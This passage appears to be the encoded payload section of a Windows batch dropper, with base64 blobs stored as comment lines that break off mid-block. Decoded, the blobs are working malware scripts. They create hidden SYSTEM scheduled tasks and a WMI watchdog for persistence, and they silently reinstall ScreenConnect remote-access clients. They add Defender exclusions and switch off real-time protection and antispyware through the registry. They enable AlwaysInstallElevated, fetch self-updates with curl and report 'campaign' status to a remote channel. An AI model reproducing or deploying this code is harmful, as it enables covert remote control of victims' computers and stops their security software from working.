::IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcdGdfcmVwb3J0Lm5ldyIgIiVURzIlIiA+
::bnVsIDI+JjENCmZvciAlJUYgaW4gKCIlV0QlXHRnX3JlcG9ydC5uZXciKSBkbyBp
::ZiAlJX56RiBHVFIgMTUwMCBtb3ZlIC95ICIlV0QlXHRnX3JlcG9ydC5uZXciICIl
::V0QlXHRnX3JlcG9ydC5wczEiID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1zc2wt
::bm8tcmV2b2tlIC1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDMwIC1vICIl
::V0QlXG93bl9zZWN1cmUubmV3IiAiJU9XTlNFQyUiID5udWwgMj4mMQ0KaWYgbm90
::IGV4aXN0ICIlV0QlXG93bl9zZWN1cmUubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5l
::Y3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMzAgLW8gIiVXRCVcb3duX3NlY3VyZS5u
::ZXciICIlT1dOU0VDMiUiID5udWwgMj4mMQ0KZm9yICUlRiBpbiAoIiVXRCVcb3du
::X3NlY3VyZS5uZXciKSBkbyBpZiAlJX56RiBHVFIgODAwIG1vdmUgL3kgIiVXRCVc
::b3duX3NlY3VyZS5uZXciICIlV0QlXG93bl9zZWN1cmUuY21kIiA+bnVsIDI+JjEN
::CiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA4
::IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX2xpYi5uZXciICIlT1dOTElCJSIg
::Pm51bCAyPiYxDQppZiBub3QgZXhpc3QgIiVXRCVcb3duX2xpYi5uZXciICIlQ1VS
::TCUiIC1MIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdE
::JVxvd25fbGliLm5ldyIgIiVPV05MSUIyJSIgPm51bCAyPiYxDQpmb3IgJSVGIGlu
::ICgiJVdEJVxvd25fbGliLm5ldyIpIGRvIGlmICUlfnpGIEdUUiAxNTAwIG1vdmUg
::L3kgIiVXRCVcb3duX2xpYi5uZXciICIlV0QlXG93bl9saWIucHMxIiA+bnVsIDI+
::JjENCnJlbSBzZWxmLXVwZGF0ZTogZG93bmxvYWQgbmV3IG93bl9tb24sIGFwcGx5
::IEFGVEVSIHRoaXMgdGljaw0Kc2V0ICJTRUxGX1VQRD0wIg0KIiVDVVJMJSIgLUwg
::LS1zc2wtbm8tcmV2b2tlIC1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQw
::IC1vICIlV0QlXG93bl9tb24ubmV4dCIgIiVPV05NT04lIiA+bnVsIDI+JjENCmlm
::IG5vdCBleGlzdCAiJVdEJVxvd25fbW9uLm5leHQiICIlQ1VSTCUiIC1MIC0tY29u
::bmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVxvd25fbW9uLm5l
::eHQiICIlT1dOTU9OMiUiID5udWwgMj4mMQ0KZm9yICUlRiBpbiAoIiVXRCVcb3du
::X21vbi5uZXh0IikgZG8gaWYgJSV+ekYgR1RSIDE1MDAgKA0KICBmYyAvYiAiJVdE
::JVxvd25fbW9uLm5leHQiICIlV0QlXG93bl9tb24uY21kIiA+bnVsIDI+JjENCiAg
::aWYgZXJyb3JsZXZlbCAxIHNldCAiU0VMRl9VUEQ9MSINCikNCg0KcmVtIOKUgOKU
::gCBbQl0gcmUtYXJtIGNoYWluIDEgKHNjaHRhc2tzKSBpZiBtaXNzaW5nIOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgA0Kc2NodGFza3MgL1F1ZXJ5IC9UTiAiJVRBU0tfQSUiID5udWwgMj4m
::MQ0KaWYgZXJyb3JsZXZlbCAxICgNCiAgZWNobyByZWFybSBUQVNLX0EgJVRBU0tf
::QSU+PiIlTE9HJQ0KICBzY2h0YXNrcyAvQ3JlYXRlIC9GIC9UTiAiJVRBU0tfQSUi
::IC9TQyBNSU5VVEUgL01PICVNT19BJSAvUlUgU1lTVEVNIC9STCBISUdIRVNUIC9U
::UiAiY21kIC9jICVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQ0KICBzY2h0YXNr
::cyAvUnVuIC9UTiAiJVRBU0tfQSUiID5udWwgMj4mMQ0KKQ0Kc2NodGFza3MgL1F1
::ZXJ5IC9UTiAiJVRBU0tfQiUiID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxICgN
::CiAgZWNobyByZWFybSBUQVNLX0IgJVRBU0tfQiU+PiIlTE9HJQ0KICBzY2h0YXNr
::cyAvQ3JlYXRlIC9GIC9UTiAiJVRBU0tfQiUiIC9TQyBNSU5VVEUgL01PICVNT19C
::JSAvUlUgU1lTVEVNIC9STCBISUdIRVNUIC9UUiAiY21kIC9jICVXRCVcb3duX21v
::bi5jbWQiID5udWwgMj4mMQ0KICBzY2h0YXNrcyAvUnVuIC9UTiAiJVRBU0tfQiUi
::ID5udWwgMj4mMQ0KKQ0Kc2NodGFza3MgL1F1ZXJ5IC9UTiAiJVRBU0tfQyUiID5u
::dWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxICgNCiAgZWNobyByZWFybSBUQVNLX0Mg
::JVRBU0tfQyU+PiIlTE9HJQ0KICBzY2h0YXNrcyAvQ3JlYXRlIC9GIC9UTiAiJVdB
::U0tfQyUiIC9TQyBPTlNUQVJUIC9SVSBTWVNURU0gL1JMIEhJR0hFU1QgL1RSICJj
::bWQgL2MgJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxDQopDQpzY2h0YXNrcyAv
::UXVlcnkgL1ROICIlVEFTS19EJSIgPm51bCAyPiYxDQppZiBlcnJvcmxldmVsIDEg
::KA0KICBlY2hvIHJlYXJtIFRBU0tfRCAlVEFTS19EJT4+IiVMT0clIg0KICBzY2h0
::YXNrcyAvQ3JlYXRlIC9GIC9UTiAiJVRBU0tfRCUiIC9TQyBPTkxPR09OIC9STCBI
::SUdIRVNUIC9UUiAiY21kIC9jICVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQ0K
::KQ0KDQpyZW0g4pSA4pSAIFtCMl0gcmUtYXJtIGNoYWluIDIgKFdNSSBzdWJzY3Jp
::cHRpb24pIGlmIG1pc3Npbmcg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpp
::ZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgKA0KICBmb3IgL2YgInVzZWJhY2tx
::IGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50
::ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3du
::X2xpYi5wczEiIC1BY3Rpb24gd2F0Y2hkb2ctZW5zdXJlIC1Xb3JrRGlyICIlV0Ql
::IiAtTW9uUGF0aCAiJVdEJVxvd25fbW9uLmNtZCJgKSBkbyBzZXQgIldEX1NUQVRF
::PSUlUiINCiAgaWYgL0kgIiFXRF9TVEFURSEiPT0iUkVBUk1FRCIgZWNobyB3YXRj
::aGRvZyBXTUkgUkVBUk1FRD4+IiVMT0clIg0KKQ0KDQpyZW0g4pSA4pSAIFtDXSBo
::ZWFsIFNjcmVlbkNvbm5lY3QgcHJpbS9hbHQg4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSADQpmb3IgL2YgInRva2Vucz0xLDIgZGVsaW1zPSgpIiAlJWEgaW4gKCdzYyBx
::dWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIF4gfCBmaW5k
::c3RyIC9DOiJTRVJWSUNFX05BTUUiJykgZG8gKA0KICBzZXQgL2EgQ09VTlQrPTEN
::CiAgc2V0ICJJTlNUQUxMRUQ9MSINCiAgc2V0ICJQUklNU1RBVEU9JSViIg0KKQ0K
::c2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZp
::bmQgIlJVTk5JTkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJQUklN
::X09LPTEiDQpmb3IgL2YgInRva2Vucz0xLDIgZGVsaW1zPSgpIiAlJWEgaW4gKCdz
::YyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgXnwgZmlu
::ZHN0ciAvQzoiU0VSVklDRV9OQU1FIicpIGRvIHNldCAvYSBDT1VOVCs9MQ0Kc2Mg
::cXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiIHwgZmluZCAi
::UlVOTklORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkFMVF9PSz0x
::Ig0KDQppZiAiJUlOU1RBTExFRCUiPT0iMSIgaWYgIiVQUklNX09LJSI9PSIwIiAo
::DQogIGVjaG8gc3ZjIGhlYWwgcmVzdGFydD4+IiVMT0clIg0KICBuZXQgc3RhcnQg
::IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjENCiAg
::c2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZp
::bmQgIlJVTk5JTkciID5udWwNCiAgaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIlBS
::SU1fT0s9MSINCikNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0sl
::Ij09IjAiICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
::ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBz
::MSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIl
::IC1FeHRyYSAic3ZjLXdvbnQtc3RhcnQiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0
::YXRlIERPV04gIlNjcmVlbkNvbm5lY3QgKCVLRUVQX0ZQJSkgaW5zdGFsbGVkIGJ1
::dCB3b250IHN0YXJ0Ig0KICBnb3RvIDpGb3JlaWduQ2hlY2sNCikNCmlmICIlSU5T
::VEFMTEVEJSI9PSIxIiBnb3RvIDpGb3JlaWduQ2hlY2sNCg0KcmVtIOKUgOKUgCBb
::RF0gcHJpbWFyeSBTQyBtaXNzaW5nIC0gZnVsbCByZWluc3RhbGwg4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::DQplY2hvIHN2YyBtaXNzaW5nIC0gcmVpbnN0YWxsaW5nPj4iJUxPRyUNCmNhbGwg
::Okluc3RhbGxNc2kgIiVNU0lfVVJMJSIgIm1haW4iDQppZiAiJUlOU1RBTExFRCUi
::PT0iMCIgY2FsbCA6SW5zdGFsbE1zaSAiJU1TSV9QS0cxP3Q9JVJBTkRPTSUiICJn
::aXRodWItcGtnIg0KaWYgIiVJTlNUQUxMRUQlIj09IjAiIGNhbGwgOkluc3RhbGxN
::c2kgIiVNU0lfUEtHMiUiICJqc2RlbGl2ci1wa2ciDQppZiAiJUlOU1RBTExFRCUi
::PT0iMCIgKA0KICBmb3IgJSVGIGluICgiJU1TSSUiKSBkbyBpZiAlJX56RiBHVFIg
::MTAwMDAwMCAoDQogICAgZWNobyBjYWNoZSByZXRyeSBpbnN0YWxsPj4iJUxPRyUi
::DQogICAgbXNpZXhlYyAvaSAiJU1TSSUiIC9xbiAvbm9yZXN0YXJ0ID5udWwgMj4m
::MQ0KICAgIGNhbGwgOldhaXRTdmMNCiAgKQ0KKQ0KaWYgIiVJTlNUQUxMRUQlIj09
::IjAiICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
::RXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIg
::LUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1F
::eHRyYSAibXNpLWZhaWxlZCIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUgRkFJ
::TCAiTVNJIGluc3RhbGwgZmFpbGVkIG9uIGFsbCBzb3VyY2VzIg0KKSBlbHNlICgN
::CiAgZWNobyBzdmMgcmVzdG9yZWQ+PiIlTE9HJQ0KICBwb3dlcnNoZWxsIC1Ob1By
::b2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1G
::aWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIl
::V0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJyZXN0b3JlZCIgPm51bCAyPiYx
::DQogIGNhbGwgOlRnU3RhdGUgUkVTVE9SRUQgIlNjcmVlbkNvbm5lY3QgcmVpbnN0
::YWxsZWQgT0siDQopDQoNCjpGb3JlaWduQ2hlY2sNCnJlbSDilIDilIAgW0VdIGNv
::dW50IGZvcmVpZ24gU0MgbGVmdG92ZXJzIChuZXZlciB0b3VjaCBhbGxvd2xpc3Qp
::IOKUgOKUgOKUgOKUgOKUgOKUgA0KZm9yIC9mICJ0b2tlbnM9MiBkZWxpbXM9KCki
::ICUlYSBpbiAoJ3NjIHF1ZXJ5IHN0YXRlXj0gYWxsIF4gfCBmaW5kc3RyIC9DOiJT
::RVJWSUNFX05BTUU6IFNjcmVlbkNvbm5lY3QgQ2xpZW50IicpIGRvICgNCiAgc2V0
::ICJGUD0lJWEiDQogIHNldCAiRlA9IUZQOiA9PSINCiAgc2V0IC9hIENPVU5UKz0x
::DQogIGlmIC9JIG5vdCAiIUZQISI9PSIlS0VFUF9GUCUiIGlmIC9JIG5vdCAiIUZQ
::ISI9PSIlQUxUX0ZQJSIgKA0KICAgIHNldCAvYSBGT1JFSUdOX0xFRlQrPTENCiAg
::ICBzZXQgIkZPUkVJR05fTElTVD0hRk9SRUlHTl9MSVNUIUZQISAiDQogICkNCikN
::Cg0KcmVtIOKUgOKUgCBbRl0gc3RlYWx0aCByZS1zZWN1cmUgKHF1aWV0IERlZmVu
::ZGVyIGV4Y2x1c2lvbiByZWZyZXNoKSDilIDilIANCnBvd2Vyc2hlbGwgLU5vUHJv
::ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNv
::bW1hbmQgInRyeSB7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJyVX
::RCUnLCclRVRMJScgLUVycm9yQWN0aW9uIFN0b3AgfSBjYXRjaCB7fSIgPm51bCAy
::PiYxDQoNCnJlbSDilIDilIAgW0ddIHBlcmlvZGljIGZ1bGwgcmUtc2VjdXJlIGV2
::ZXJ5IH4yIGgg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5v
::bkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoVGVzdC1QYXRoICclV0QlXG93bl9z
::ZWN1cmUuY21kJykgLWFuZCAoKCAtbm90IChUZXN0LVBhdGggJyVXRCVcc2VjLmZs
::YWcnKSkgLW9yICgoKEdldC1EYXRlKSAtIChHZXQtSXRlbSAtTGl0ZXJhbFBhdGgg
::JyVXRCVcc2VjLmZsYWcnKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbEhvdXJzIC1nZSAy
::KSkpeyBleGl0IDEgfSBlbHNlIHsgZXhpdCAwIH0iID5udWwgMj4mMQ0KaWYgZXJy
::b3JsZXZlbCAxICgNCiAgZWNobyBwZXJpb2RpYyByZS1zZWN1cmU+PiIlTE9HJQ0K
::ICBjYWxsICIlV0QlXG93bl9zZWN1cmUuY21kIiA+PiIlTE9HJTIgMj4mMQ0KICBl
::Y2hvIGRvbmU+IiVXRCVcc2VjLmZsYWciDQopDQoNCnJlbSDilIDilIAgW0hdIGNh
::bXBhaWduIHN0YXRlICsgaG91cmx5IGNvbXBhY3QgZGlnZXN0IOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgZXhpc3Qg
::IiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50
::ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3du
::X2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAl
::TU9OVkVSJSA+bnVsIDI+JjENCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50
::ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChUZXN0LVBhdGggJyVIQkZMQUclJykgLWFu
::ZCAoTmV3LVRpbWVTcGFuIC1TdGFydCAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICcl
::SEJGTEFHJScpLkxhc3RXcml0ZVRpbWUpLlRvdGFsTWludXRlcyAtbHQgNjApeyBl
::eGl0IDAgfSBlbHNlIHsgZXhpdCAxIH0iID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZl
::bCAxICgNCiAgZWNobyBoYj4lSEJGTEFHJQ0KICBwb3dlcnNoZWxsIC1Ob1Byb2Zp
::bGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxl
::ICIlV0QlXHRnX3JlcG9ydC5wczEiIC1TdGF0ZSBIQiAtTW9kZSBjb21wYWN0IC1C
::dWlsZCAlTU9OVkVSJSAtQ291bnQgIUNPVU5UISA+bnVsIDI+JjENCiAgZWNobyBk
::aWdlc3QgSEIgc2VudD4+IiVMT0clIg0KKQ0KDQpyZW0g4pSA4pSAIFtJXSBzZWxm
::LXVwZGF0ZSBhcHBseSAobGFzdCB0aGluZyB0aGlzIHRpY2spIOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgIiVTRUxGX1VQRCUi
::PT0iMSIgKA0KICBlY2hvIHNlbGYtdXBkYXRlIGFwcGx5Pj4iJUxPRyUNCiAgbW92
::ZSAveSAiJVdEJVxvd25fbW9uLm5leHQiICIlV0QlXG93bl9tb24uY21kIiA+bnVs
::IDI+JjENCikNCg0KZWNobyB0aWNrIGRvbmU6IHByaW09JVBSSU1fT0slIGFsdD0l
::QUxUX09LJSBmb3JlaWduPSVGT1JFSUdOX0xFRlQlPj4iJUxPRyUNCmVuZGxvY2Fs
::DQpleGl0IC9iIDANCg0KcmVtIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkCBoZWxwZXJzIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkA0KOkluc3RhbGxNc2kNCnJlbSAlMT11
::cmwgJTI9dGFnDQpzZXQgIlVSTD0lfjEiDQpzZXQgIlRBRz0lfjIiDQplY2hvIFsl
::VEFHJV0gZmV0Y2ggJVVSTCU+PiIlTE9HJQ0KIiVDVVJMJSIgLUwgLS1zc2wtbm8t
::cmV2b2tlIC1jb25uZWN0LXRpbWVvdXQgMjUgLS1tYXgtdGltZSAzMDAgLW8gIiVN
::U0klLnRtcCIgIiVVUkwlIiA+PiIlTE9HJTIgMj4mMQ0KZm9yICUlRiBpbiAoIiVN
::U0klLnRtcCIpIGRvIGlmICUlfnpGIExFUSAxMDAwMDAwICgNCiAgZWNobyBbJVRB
::RyVdIGZldGNoIGZhaWxlZD4+IiVMT0clIg0KICBkZWwgL2YgL3EgIiVNU0klLnRt
::cCIgPm51bCAyPiYxDQogIGV4aXQgL2IgMQ0KKQ0KbW92ZSAveSAiJU1TSSUudG1w
::IiAiJU1TSSUiID5udWwgMj4mMQ0KZWNobyBbJVRBRyVdIG1zaWV4ZWMgaW5zdGFs
::bD4+IiVMT0clIg0KbXNpZXhlYyAvaSAiJU1TSSUiIC9xbiAvbm9yZXN0YXJ0ID5u
::dWwgMj4mMQ0KY2FsbCA6V2FpdFN2Yw0KZXhpdCAvYiAwDQoNCjpXYWl0U3ZjDQpz
::ZXQgIlRSSUVTPTAiDQo6V2FpdExvb3ANCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0
::IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQppZiBu
::b3QgZXJyb3JsZXZlbCAxICgNCiAgc2V0ICJJTlNUQUxMRUQ9MSINCiAgc2V0ICJQ
::UklNX09LPTEiDQogIGV4aXQgL2IgMA0KKQ0Kc2V0IC9hIFRSSUVTKz0xDQppZiAl
::VFJJRVMlIEdFUSAxMCBleGl0IC9iIDENCnBpbmcgMTI3LjAuMC4xIC1uIDcgPm51
::bCAyPiYxDQpnb3RvIDpXYWl0TG9vcA0KDQo6VGdTdGF0ZQ0Kc2V0ICJORVdTVEFU
::RT0lfjEiDQpzZXQgIk1TRz0lfjIiDQpzZXQgIk9MRFNUQVRFPSINCmlmIGV4aXN0
::ICIlU1RBVEUlIiBzZXQgL3AgT0xEU1RBVEU9PCIlU1RBVEUlIg0KcmVtIHJhdGUt
::bGltaXQgcmVwZWF0ZWQgRE9XTi9GQUlMOiBtYXggMSBhbGVydCBwZXIgMzAgbWlu
::IHdoaWxlIHN0dWNrDQppZiAvSSAiJU5FV1NUQVRFJSI9PSJET1dOIiBnb3RvIDpN
::YXliZVN1cHByZXNzDQppZiAvSSAiJU5FV1NUQVRFJSI9PSJGQUlMIiBnb3RvIDpN
::YXliZVN1cHByZXNzDQpnb3RvIDpTZW5kQWxlcnQNCjpNYXliZVN1cHByZXNzDQpp
::ZiAvSSAiJU5FV1NUQVRFJSI9PSIlT0xEU1RBVEUlIiBpZiBleGlzdCAiJVdEJVx0
::Z19zZW50LmZsYWciICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRl
::cmFjdGl2ZSAtQ29tbWFuZCAiaWYoKE5ldy1UaW1lU3BhbiAtU3RhcnQgKEdldC1J
::dGVtIC1MaXRlcmFsUGF0aCAnJVdEJVx0Z19zZW50LmZsYWcnKS5MYXN0V3JpdGVU
::aW1lKS5Ub3RhbE1pbnV0ZXMgLWx0IDMwKXt7ZXhpdCAwfWVsc2V7ZXhpdCAxfSIg
::Pm51bCAyPiYxDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gdGdf
::c3VwcHJlc3NlZF8lTkVXU1RBVEUlPj4iJUxPRyUNCiAgICBleGl0IC9iIDANCiAg
::KQ0KKQ0KOlNlbmRBbGVydA0KZWNobyAlTkVXU1RBVEUlPiIlU1RBVEUlIg0KZWNo
::byBzZW50PiIlV0QlXHRnX3NlbnQuZmxhZyINCnBvd2Vyc2hlbGwgLU5vUHJvZmls
::ZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUg
::IiVXRCVcdGdfcmVwb3J0LnBzMSIgLVN0YXRlICVORVdTVEFURSUlIC1TdW1tYXJ5
::ICIlTVNHJSIgLUJ1aWxkICVNT05WRVIlIC1Db3VudCAlQ09VTlQlID5udWwgMj4m
::MQ0KZWNobyB0ZyBzdGF0ZSAlTkVXU1RBVEUlIHNlbnQ+PiIlTE9HJQ0KZXhpdCAv
::YiAwDQo=
::B64_MON_END
::B64_SEC_BEGIN
::QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwMlM0IC0gaWRl
::bnRpdHktYXdhcmUgdGFzayBBQ0wgKyBEaXNhYmxlTVNJIG5ldXRyYWxpemUgKyBl
::eGNsdXNpb25zL0FDTA0Kc2V0bG9jYWwgRW5hYmxlRXh0ZW5zaW9ucyBFbmFibGVE
::ZWxheWVkRXhwYW5zaW9uDQpzZXQgIldEPSVQcm9ncmFtRGF0YSVcTWljcm9zb2Z0
::XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUiDQpzZXQgIldEMj0lUHJvZ3JhbURh
::dGElXE1pY3Jvc29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlIg0Kc2V0ICJM
::T0c9JVdEJVxib290LmVyciINCnNldCAiUFJJTT1TY3JlZW5Db25uZWN0IENsaWVu
::dCAoNWY2MDEwNTc5ODUyZTUwNykiDQpzZXQgIkFMVD1TY3JlZW5Db25uZWN0IENs
::aWVudCAoZjg2MWM4MTQwZDQ1MzQyNykiDQpzZXQgIktFRVAxPTVmNjAxMDU3OTg1
::MmU1MDciDQpzZXQgIktFRVAyPWY4NjFjODE0MGQ0NTM0MjciDQpzZXQgIlBGPSVQ
::cm9ncmFtRmlsZXMlIg0Kc2V0ICJQRjg2PSVQcm9ncmFtRmlsZXMoeDg2KSUiDQpz
::ZXQgIlRBU0tST09UPSVTeXN0ZW1Sb290JVxTeXN0ZW0zMlxUYXNrcyINCg0KaWYg
::bm90IGV4aXN0ICIlV0QlIiBta2RpciAiJVdEJSIgPm51bCAyPiYxDQppZiBub3Qg
::ZXhpc3QgIiVXRDIlIiBta2RpciAiJVdEMiUgPm51bCAyPiYxDQplY2hvIHNlY3Vy
::ZV9iZWdpbiAlREFURSUgJVRJTUUlIFM0Pj4iJUxPRyUNCg0KUkVNIC0tLSBwZXIt
::aG9zdCBpZGVudGl0eTogd2hpY2ggdGFzayBYTUxzIGJlbG9uZyB0byB1cyAtLS0N
::CnNldCAiVEFTS1NfTElTVD1NaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNcU2No
::ZWR1bGVkIE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXIgTWljcm9zb2Z0XFdp
::bmRvd3NcV0RJXFJlc29sdXRpb25Ib3N0IE1pY3Jvc29mdFxXaW5kb3dzXFRjcGlw
::XElwQWRkcmVzc0NvbmZsaWN0MSINCmlmIGV4aXN0ICIlV0QlXGlkZW50aXR5LmNm
::ZyIgKA0KICBzZXQgIlRBU0tTX0xJU1Q9Ig0KICBmb3IgL2YgInVzZWJhY2txIHRv
::a2Vucz0xLDIgZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcaWRlbnRpdHkuY2ZnIikg
::ZG8gKA0KICAgIHNldCAiSz0lJUsiDQogICAgc2V0ICJWPSUlViINCiAgICBpZiAi
::IUtOfjAsNSEiPT0iVEFTS18iIHNldCAiVEFTS1NfTElTVD0hVEFTS1NfTElTVCEg
::IVY6fjEhIg0KICApDQopDQoNClJFTSAtLS0gTmV1dHJhbGl6ZSBNU0kgYmxvY2sg
::cG9saWNpZXMgKDE2MjUpIC0tLQ0KUkVNIERpc2FibGVNU0k6IDA9YWxsb3csIDE9
::bm9uLWFkbWluIG9ubHksIDI9YWxsIC0+IGZvcmNlIDANCnJlZyBhZGQgIkhLTE1c
::U09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAv
::diBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVn
::IGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJ
::bnN0YWxsZXIiIC92IEFsd2F5c0luc3RhbGxFbGV2YXRlZCAvdCBSRUdfRFdPUkQg
::L2QgMSAvZiA+bnVsIDI+JjENCnJlZyBkZWxldGUgIkhLQ1VcU09GVFdBUkVcUG9s
::aWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBEaXNhYmxlTVNJ
::IC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtDVVxTT0ZUV0FSRVxQb2xpY2llc1xN
::aWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IEFsd2F5c0luc3RhbGxFbGV2
::YXRlZCAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCg0KUkVNIC0tLSBE
::ZWZlbmRlcjogcmVnaXN0cnkgZXhjbHVzaW9ucyAocG9saWN5ICsgcHJlZmVyZW5j
::ZSBrZXlzKSAtLS0NCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWlj
::cm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXIiIC92IERpc2FibGVBbnRpU3B5d2FyZSAv
::dCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09G
::VFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1U
::aW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgL3Qg
::UkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRX
